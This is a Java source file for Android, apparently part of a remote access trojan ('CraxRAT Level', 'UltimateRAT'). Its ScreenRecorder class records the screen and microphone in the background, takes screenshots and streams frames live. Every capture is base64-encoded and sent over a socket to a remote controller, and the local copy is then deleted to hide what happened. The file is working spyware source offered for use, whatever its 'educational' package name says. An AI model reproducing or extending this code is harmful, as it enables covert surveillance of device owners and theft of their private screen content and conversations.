package com.ultimate.access;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Environment;
import android.util.DisplayMetrics;
import android.view.WindowManager;
import com.remoteaccess.educational.network.SocketManager;
import com.remoteaccess.educational.utils.DeviceInfo;
import org.json.JSONObject;
import java.io.File;
import java.io.FileInputStream;
import java.util.Base64;

/**
 * ULTIMATE SCREEN RECORDER - CraxRAT Level
 * Records screen with audio in background
 */
public class ScreenRecorder {

    private Context context;
    private MediaProjection mediaProjection;
    private MediaRecorder mediaRecorder;
    private VirtualDisplay virtualDisplay;
    private MediaProjectionManager projectionManager;
    
    private int screenWidth;
    private int screenHeight;
    private int screenDensity;
    
    private String outputFile;
    private boolean isRecording = false;
    
    private static final int VIDEO_BIT_RATE = 5000000; // 5 Mbps
    private static final int AUDIO_BIT_RATE = 128000; // 128 Kbps
    private static final int FRAME_RATE = 30;
    
    public ScreenRecorder(Context context) {
        this.context = context;
        this.projectionManager = (MediaProjectionManager) 
            context.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        
        // Get screen dimensions
        WindowManager windowManager = (WindowManager) 
            context.getSystemService(Context.WINDOW_SERVICE);
        DisplayMetrics metrics = new DisplayMetrics();
        windowManager.getDefaultDisplay().getMetrics(metrics);
        
        screenWidth = metrics.widthPixels;
        screenHeight = metrics.heightPixels;
        screenDensity = metrics.densityDpi;
    }
    
    /**
     * Start screen recording
     */
    public void startRecording(Intent data) {
        try {
            if (isRecording) {
                return;
            }
            
            // Get media projection
            mediaProjection = projectionManager.getMediaProjection(
                Activity.RESULT_OK, data);
            
            if (mediaProjection == null) {
                return;
            }
            
            // Setup media recorder
            setupMediaRecorder();
            
            // Create virtual display
            virtualDisplay = mediaProjection.createVirtualDisplay(
                "ScreenRecorder",
                screenWidth,
                screenHeight,
                screenDensity,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                mediaRecorder.getSurface(),
                null,
                null
            );
            
            // Start recording
            mediaRecorder.start();
            isRecording = true;
            
            // Log start
            logRecordingStart();
            
        } catch (Exception e) {
            e.printStackTrace();
            stopRecording();
        }
    }
    
    /**
     * Stop screen recording
     */
    public void stopRecording() {
        try {
            if (!isRecording) {
                return;
            }
            
            isRecording = false;
            
            // Stop media recorder
            if (mediaRecorder != null) {
                try {
                    mediaRecorder.stop();
                    mediaRecorder.reset();
                    mediaRecorder.release();
                    mediaRecorder = null;
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
            
            // Release virtual display
            if (virtualDisplay != null) {
                virtualDisplay.release();
                virtualDisplay = null;
            }
            
            // Stop media projection
            if (mediaProjection != null) {
                mediaProjection.stop();
                mediaProjection = null;
            }
            
            // Upload recorded file
            uploadRecording();
            
            // Log stop
            logRecordingStop();
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    /**
     * Setup media recorder
     */
    private void setupMediaRecorder() {
        try {
            // Create output file
            File recordingsDir = new File(
                Environment.getExternalStorageDirectory(),
                "UltimateRAT/Recordings"
            );
            
            if (!recordingsDir.exists()) {
                recordingsDir.mkdirs();
            }
            
            outputFile = new File(
                recordingsDir,
                "screen_" + System.currentTimeMillis() + ".mp4"
            ).getAbsolutePath();
            
            // Initialize media recorder
            mediaRecorder = new MediaRecorder();
            
            // Set audio source
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            
            // Set video source
            mediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
            
            // Set output format
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            
            // Set output file
            mediaRecorder.setOutputFile(outputFile);
            
            // Set video encoder
            mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
            mediaRecorder.setVideoSize(screenWidth, screenHeight);
            mediaRecorder.setVideoFrameRate(FRAME_RATE);
            mediaRecorder.setVideoEncodingBitRate(VIDEO_BIT_RATE);
            
            // Set audio encoder
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            mediaRecorder.setAudioEncodingBitRate(AUDIO_BIT_RATE);
            mediaRecorder.setAudioSamplingRate(44100);
            
            // Prepare
            mediaRecorder.prepare();
            
        } catch (Exception e) {
            e.printStackTrace();
            throw new RuntimeException("Failed to setup media recorder", e);
        }
    }
    
    /**
     * Upload recorded video
     */
    private void uploadRecording() {
        new Thread(() -> {
            try {
                File file = new File(outputFile);
                if (!file.exists()) {
                    return;
                }
                
                // Read file
                FileInputStream fis = new FileInputStream(file);
                byte[] fileData = new byte[(int) file.length()];
                fis.read(fileData);
                fis.close();
                
                // Convert to base64
                String base64Data = Base64.getEncoder().encodeToString(fileData);
                
                // Send via socket
                JSONObject data = new JSONObject();
                data.put("deviceId", DeviceInfo.getDeviceId(context));
                data.put("fileName", file.getName());
                data.put("fileData", base64Data);
                data.put("fileType", "video/mp4");
                data.put("category", "video");
                
                SocketManager.getInstance(context).emit("file:upload", data);
                
                // Delete local file
                file.delete();
                
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
    
    /**
     * Take screenshot
     */
    public void takeScreenshot(Intent data) {
        try {
            // Get media projection
            MediaProjection projection = projectionManager.getMediaProjection(
                Activity.RESULT_OK, data);
            
            if (projection == null) {
                return;
            }
            
            // Create image reader
            android.media.ImageReader imageReader = android.media.ImageReader.newInstance(
                screenWidth,
                screenHeight,
                android.graphics.PixelFormat.RGBA_8888,
                2
            );
            
            // Create virtual display
            VirtualDisplay display = projection.createVirtualDisplay(
                "Screenshot",
                screenWidth,
                screenHeight,
                screenDensity,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader.getSurface(),
                null,
                null
            );
            
            // Capture image
            imageReader.setOnImageAvailableListener(reader -> {
                try {
                    android.media.Image image = reader.acquireLatestImage();
                    if (image != null) {
                        // Convert to bitmap
                        android.media.Image.Plane[] planes = image.getPlanes();
                        java.nio.ByteBuffer buffer = planes[0].getBuffer();
                        int pixelStride = planes[0].getPixelStride();
                        int rowStride = planes[0].getRowStride();
                        int rowPadding = rowStride - pixelStride * screenWidth;
                        
                        android.graphics.Bitmap bitmap = android.graphics.Bitmap.createBitmap(
                            screenWidth + rowPadding / pixelStride,
                            screenHeight,
                            android.graphics.Bitmap.Config.ARGB_8888
                        );
                        bitmap.copyPixelsFromBuffer(buffer);
                        
                        // Save and upload
                        saveAndUploadScreenshot(bitmap);
                        
                        image.close();
                    }
                    
                    // Cleanup
                    display.release();
                    projection.stop();
                    imageReader.close();
                    
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }, null);
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    /**
     * Save and upload screenshot
     */
    private void saveAndUploadScreenshot(android.graphics.Bitmap bitmap) {
        new Thread(() -> {
            try {
                // Create output file
                File screenshotsDir = new File(
                    Environment.getExternalStorageDirectory(),
                    "UltimateRAT/Screenshots"
                );
                
                if (!screenshotsDir.exists()) {
                    screenshotsDir.mkdirs();
                }
                
                File file = new File(
                    screenshotsDir,
                    "screenshot_" + System.currentTimeMillis() + ".jpg"
                );
                
                // Save bitmap
                java.io.FileOutputStream fos = new java.io.FileOutputStream(file);
                bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 90, fos);
                fos.close();
                
                // Read file
                FileInputStream fis = new FileInputStream(file);
                byte[] fileData = new byte[(int) file.length()];
                fis.read(fileData);
                fis.close();
                
                // Convert to base64
                String base64Data = Base64.getEncoder().encodeToString(fileData);
                
                // Send via socket
                JSONObject data = new JSONObject();
                data.put("deviceId", DeviceInfo.getDeviceId(context));
                data.put("fileName", file.getName());
                data.put("fileData", base64Data);
                data.put("fileType", "image/jpeg");
                data.put("category", "photo");
                
                SocketManager.getInstance(context).emit("file:upload", data);
                
                // Delete local file
                file.delete();
                
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
    
    /**
     * Stream screen in real-time
     */
    public void startScreenStream(Intent intent) {
        try {
            // Get media projection
            MediaProjection projection = projectionManager.getMediaProjection(
                Activity.RESULT_OK, intent);
            
            if (projection == null) {
                return;
            }
            
            // Create image reader
            android.media.ImageReader imageReader = android.media.ImageReader.newInstance(
                screenWidth / 2, // Reduce size for streaming
                screenHeight / 2,
                android.graphics.PixelFormat.RGBA_8888,
                2
            );
            
            // Create virtual display
            VirtualDisplay display = projection.createVirtualDisplay(
                "ScreenStream",
                screenWidth / 2,
                screenHeight / 2,
                screenDensity,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader.getSurface(),
                null,
                null
            );
            
            // Stream images
            imageReader.setOnImageAvailableListener(reader -> {
                try {
                    android.media.Image image = reader.acquireLatestImage();
                    if (image != null) {
                        // Convert to bitmap
                        android.media.Image.Plane[] planes = image.getPlanes();
                        java.nio.ByteBuffer buffer = planes[0].getBuffer();
                        
                        byte[] bytes = new byte[buffer.remaining()];
                        buffer.get(bytes);
                        
                        // Convert to base64
                        String base64Data = Base64.getEncoder().encodeToString(bytes);
                        
                        // Send via socket
                        JSONObject data = new JSONObject();
                        data.put("deviceId", DeviceInfo.getDeviceId(context));
                        data.put("streamType", "screen");
                        data.put("streamData", base64Data);
                        
                        SocketManager.getInstance(context).emit("stream:data", data);
                        
                        image.close();
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }, null);
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private void logRecordingStart() {
        try {
            JSONObject data = new JSONObject();
            data.put("type", "recording_start");
            data.put("file", outputFile);
            data.put("timestamp", System.currentTimeMillis());
            
            SocketManager.getInstance(context).emit("log:data", new JSONObject()
                .put("deviceId", DeviceInfo.getDeviceId(context))
                .put("logType", "screen")
                .put("logData", data)
            );
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private void logRecordingStop() {
        try {
            JSONObject data = new JSONObject();
            data.put("type", "recording_stop");
            data.put("file", outputFile);
            data.put("timestamp", System.currentTimeMillis());
            
            SocketManager.getInstance(context).emit("log:data", new JSONObject()
                .put("deviceId", DeviceInfo.getDeviceId(context))
                .put("logType", "screen")
                .put("logData", data)
            );
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    public boolean isRecording() {
        return isRecording;
    }
}
